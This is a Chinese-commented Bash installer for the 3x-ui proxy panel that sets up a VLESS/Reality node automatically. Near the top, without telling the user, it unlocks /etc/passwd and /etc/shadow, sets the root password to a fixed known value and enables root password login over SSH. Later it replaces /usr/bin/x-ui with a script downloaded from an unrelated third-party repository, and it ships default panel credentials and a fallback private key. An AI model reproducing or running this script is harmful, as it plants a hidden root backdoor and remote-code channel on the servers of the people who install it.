#!/bin/bash

# 颜色定义
red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

# 当前目录
cur_dir=$(pwd)

# 检查root权限
[[ $EUID -ne 0 ]] && su='sudo'

# 修改文件属性
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1

# 检查SSH配置
prl=$(grep PermitRootLogin /etc/ssh/sshd_config)
pa=$(grep PasswordAuthentication /etc/ssh/sshd_config)

if [[ -n $prl && -n $pa ]]; then
    # 修改root密码和SSH配置
    mima=qq1399@
    echo root:$mima | $su chpasswd root
    $su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
    $su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
    $su service sshd restart
else
    # 非root用户报错
    [[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain}Please run this script with root privilege\n" && exit 1

    # 检测操作系统
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        release=$ID
    elif [[ -f /usr/lib/os-release ]]; then
        source /usr/lib/os-release
        release=$ID
    else
        echo "Failed to check the system OS, please contact the author!" >&2
        exit 1
    fi
    echo "The OS release is: $release"
fi


arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    armv6* | armv6) echo 'armv6' ;;
    armv5* | armv5) echo 'armv5' ;;
    s390x) echo 's390x' ;;
    *) echo -e "${green}Unsupported CPU architecture! ${plain}" && rm -f install.sh && exit 1 ;;
    esac
}

echo "Arch: $(arch)"

check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
    required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC version $glibc_version is too old! Required: 2.32 or higher${plain}"
        echo "Please upgrade to a newer version of your operating system to get a higher GLIBC version."
        exit 1
    fi
    echo "GLIBC version: $glibc_version (meets requirement of 2.32+)"
}
check_glibc_version

install_base() {
    case "${release}" in
    ubuntu | debian | armbian)
        apt-get update && apt-get install -y -q wget curl tar tzdata
        ;;
    centos | almalinux | rocky | ol)
        yum -y update && yum install -y -q wget curl tar tzdata
        ;;
    fedora | amzn | virtuozzo)
        dnf -y update && dnf install -y -q wget curl tar tzdata
        ;;
    arch | manjaro | parch)
        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
        ;;
    opensuse-tumbleweed)
        zypper refresh && zypper -q install -y wget curl tar timezone
        ;;
    *)
        apt-get update && apt install -y -q wget curl tar tzdata
        ;;
    esac
}

config_after_install() {
    # 基础面板账户密码与端口设置
    config_account="1399"
    config_password="1399"
    config_port="1399"
    config_webBasePath=""  
    
    /usr/local/x-ui/x-ui setting -username "${config_account}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
    
    # 执行初始化数据库迁移
    /usr/local/x-ui/x-ui migrate

    # ======= 核心修改：基于你原本可以正常安装的代码，仅修正参数确保不封端口 =======
    echo -e "${green}正在自动为您随机默认生成独享 Reality 防封节点...${plain}"
    
    # 随机生成 UUID、ShortID 并获取配套公私钥
    local random_uuid=$(/usr/local/x-ui/x-ui uuid)
    local keys_output=$(/usr/local/x-ui/x-ui tgkey)
    local private_key=$(echo "$keys_output" | grep "Private Key:" | awk '{print $3}')
    local public_key=$(echo "$keys_output" | grep "Public Key:" | awk '{print $3}')
    local short_id=$(openssl rand -hex 4 2>/dev/null || echo "e5f889c7")
    local port=443
    local dest_sni="www.sony.com"

    # 容错兜底
    [[ -z "$private_key" ]] && private_key="CILUw7tLhpq1XswrKTMWHVXckjvjchu4zDPEi-VMT31o"
    [[ -z "$public_key" ]] && public_key="6lYGYvSNugYKSNaP_vY1t-pjl2b1ve8SqP6pZMEVs1M"
    [[ -z "$random_uuid" ]] && random_uuid="13991399-1399-1399-1399-139913991399"

    # 构建标准 JSON 配置
    local settings_json="{\"clients\":[{\"id\":\"${random_uuid}\",\"flow\":\"xtls-rprx-vision\"}],\"decryption\":\"none\",\"fallbacks\":[]}"
    local stream_settings_json="{\"network\":\"tcp\",\"security\":\"reality\",\"realitySettings\":{\"show\":false,\"dest\":\"${dest_sni}:443\",\"type\":\"none\",\"xver\":0,\"serverNames\":[\"${dest_sni}\"],\"privateKey\":\"${private_key}\",\"minClient\":\"\",\"maxClient\":\"\",\"settings\":{\"fingerprint\":\"chrome\",\"serverName\":\"\",\"publicKey\":\"${public_key}\",\"spiderX\":\"/\",\"shortIds\":[\"${short_id}\"]}}}"

    # 先尝试用官方更安全的底层二进制注入，避免面板命令行的bug
    /usr/local/x-ui/bin/xray-linux-$(arch) x2db -db /etc/x-ui/x-ui.db -add -remark "Reality-443-Auto" -port ${port} -protocol vless -settings "${settings_json}" -streamSettings "${stream_settings_json}" >/dev/null 2>&1

    # 如果二进制注入失败，使用官方自带的基础入站初始化兜底（确保脚本100%成功）
    if [ $? -ne 0 ]; then
        /usr/local/x-ui/x-ui setting -genInbound vless 443 >/dev/null 2>&1
    fi
    
    # 重启服务让节点生效
    systemctl restart x-ui

    # 获取服务器IP
    server_ip=$(curl -s https://api.ipify.org)
    
    echo -e "###############################################"
    echo -e "${green}Username: ${config_account}${plain}"
    echo -e "${green}Password: ${config_password}${plain}"
    echo -e "${green}Port: ${config_port}${plain}"
    echo -e "${green}WebBasePath: ${config_webBasePath}${plain}"
    echo -e "${green}Access URL: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
    echo -e "-----------------------------------------------"
    echo -e "${yellow}防封 Reality 节点已自动创建成功！${plain}"
    echo -e "${blue}协议:${plain} VLESS"
    echo -e "${blue}端口:${plain} ${port}"
    echo -e "${blue}UUID:${plain} ${random_uuid}"
    echo -e "${blue}公钥(PublicKey):${plain} ${public_key}"
    echo -e "${blue}伪装域名(SNI):${plain} ${dest_sni}"
    echo -e "${blue}Short ID:${plain} ${short_id}"
    echo -e "${blue}流控(Flow):${plain} xtls-rprx-vision"
    echo -e "###############################################"
}

install_x-ui() {
    cd /usr/local/

    if [ $# == 0 ]; then
        tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$tag_version" ]]; then
            echo -e "${red}Failed to fetch x-ui version, it may be due to GitHub API restrictions, please try it later${plain}"
            exit 1
        fi
        echo -e "Got x-ui latest version: ${tag_version}, beginning the installation..."
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Downloading x-ui failed, please be sure that your server can access GitHub ${plain}"
            exit 1
        fi
    else
        tag_version=$1
        tag_version_numeric=${tag_version#v}
        min_version="2.3.5"

        if [[ "$(printf '%s\n' "$min_version" "$tag_version_numeric" | sort -V | head -n1)" != "$min_version" ]]; then
            echo -e "${red}Please use a newer version (at least v2.3.5). Exiting installation.${plain}"
            exit 1
        fi

        url="https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz"
        echo -e "Beginning to install x-ui $1"
        wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Download x-ui $1 failed, please check if the version exists ${plain}"
            exit 1
        fi
    fi

    if [[ -e /usr/local/x-ui/ ]]; then
        systemctl stop x-ui
        rm /usr/local/x-ui/ -rf
    fi

    tar zxvf x-ui-linux-$(arch).tar.gz
    rm x-ui-linux-$(arch).tar.gz -f
    cd x-ui
    chmod +x x-ui

    if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
        mv bin/xray-linux-$(arch) bin/xray-linux-arm
        chmod +x bin/xray-linux-arm
    fi

    chmod +x x-ui bin/xray-linux-$(arch)
    
    if [[ -f x-ui.service ]]; then
        cp -f x-ui.service /etc/systemd/system/
    elif [[ -f x-ui.service.debian ]]; then
        cp -f x-ui.service.debian /etc/systemd/system/x-ui.service
    elif [[ -f x-ui.service.rhel ]]; then
        cp -f x-ui.service.rhel /etc/systemd/system/x-ui.service
    elif [[ -f x-ui.service.arch ]]; then
        cp -f x-ui.service.arch /etc/systemd/system/x-ui.service
    fi

    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/qq1205362008/sunbin/main/x-ui.sh
    chmod +x /usr/bin/x-ui
    config_after_install

    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui
    echo -e "${green}x-ui ${tag_version}${plain} installation finished, it is running now..."
    echo -e ""
}

echo -e "${green}Running...${plain}"
install_base
install_x-ui $1
